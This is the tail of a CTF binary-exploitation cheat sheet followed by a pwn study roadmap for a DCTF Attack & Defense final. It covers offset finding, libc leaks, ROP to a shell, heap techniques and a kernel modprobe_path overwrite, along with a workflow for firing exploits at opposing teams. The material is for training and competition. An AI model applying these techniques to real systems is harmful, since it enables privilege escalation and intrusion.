// overwrite modprobe_path with "/tmp/x", trigger unknown-binary exec → root script
```

🔴 94. extract vmlinux symbols
```bash
vmlinux-to-elf vmlinux vmlinux.elf
```

🔴 95. ROP on vmlinux
```bash
ROPgadget --binary vmlinux > gadgets.txt
```

---

## Checks / helpers

🟢 96. find offset manually (buf+rbp)
```python
# buffer[64] + saved rbp(8) = 72 to reach saved RIP (x64)
```

🟡 97. leak formatter
```python
log.info("libc base: %#x", libc.address)
```

🟡 98. assert leak sanity
```python
assert libc.address & 0xfff == 0, "bad leak, offset wrong"
```

🟡 99. save working stages modular
```python
def leak(io): ...
def pwn(io): ...
io=start(); l=leak(io); pwn(io)
```

🟢 100. the universal flow
```python
# 1) find bug  2) get a leak  3) libc.address = leak - sym  4) ROP to shell  5) cat flag
```

---
> Many heap snippets are templates — wire `alloc/free/edit` to the challenge menu. Confirm glibc version (affects tcache/safe-linking).
> Tags: #ctf #pwn #scripts


---

## 🗺️ DCTF Roadmap — Pwn

> Pwn is the heart of the DCTF **Attack & Defense final**: find a memory bug in a binary service, weaponize it, fire it at every team. Also a quals staple. See [[DCTF Finals Playbook]] and [[Roadmap]].

### What to study (in order)
1. **Prereqs** — C, x86-64 asm, the stack (saved RIP), calling convention, `checksec` meaning. (section A)
2. **Stack** — overflow → offset (cyclic) → ret2win → arg control via `pop rdi`. (sections B–C)
3. **ROP + libc** — ret2libc (leak puts@GOT → libc base → system/"/bin/sh"), one_gadget, ret2csu. (section E)
4. **Format string** — leak with `%p`, arbitrary write with `fmtstr_payload`, GOT overwrite. (section F)
5. **Protection bypass** — canary leak, PIE/ASLR via leak, RELUX targets. (section G)
6. **Heap** — UAF, double free, tcache poisoning, unsorted-bin leak, hooks/FSOP. (sections H–I)
7. **Advanced** — seccomp/ORW, SROP, kernel (modprobe_path, ret2usr, KASLR). (sections K–L)

### How to study
- **The universal flow is everything:** leak → compute base → ROP to shell. Internalize it. (technique 96)
- Rebuild each exploit from a blank file; don't copy your old one.
- **Match the remote with Docker/pwninit** so local offsets are real.
- Keep a per-glibc heap notes page — tcache/safe-linking behavior changes by version.

### How to exercise
- **pwn.college** (structured, best foundation) → **ROP Emporium** (ROP drills) → **pwnable.kr** then **pwnable.tw**.
- **shellphish/how2heap** — reproduce each technique on your own glibc.
- Drill: ret2libc from scratch in <20 min against a fresh binary.

### How to do things (per-challenge workflow)
1. `checksec` + read for the bug (gets/scanf/printf/UAF). (scripts 1–12)
2. Find the offset (cyclic). (scripts 9–11)
3. Get a leak (puts@GOT / format string), set `libc.address`. (scripts 39, 46–53)
4. Build the ROP chain to `system("/bin/sh")` or one_gadget. (scripts 40–45)
5. `io.interactive()`, `cat flag`. Loop remote if flaky. (script 81)

### In the DCTF A/D final
1. First hour: snapshot, read the binary service, find the bug.
2. Weaponize into `ad_exploit.py` that takes `TARGET_IP`, returns the flag. (see [[Pwn-Scripts]] + `99-Scripts/ad_exploit.py`)
3. Fire at **every** team via the farm (DestructiveFarm/CookieFarm).
4. **Patch your own** copy of the bug without breaking the service (SLA). Re-fire each tick.
5. Watch your pcap (Tulip) — steal other teams' exploits and fire them back.

> Tags: #ctf #pwn #roadmap #dctf #attack-defense
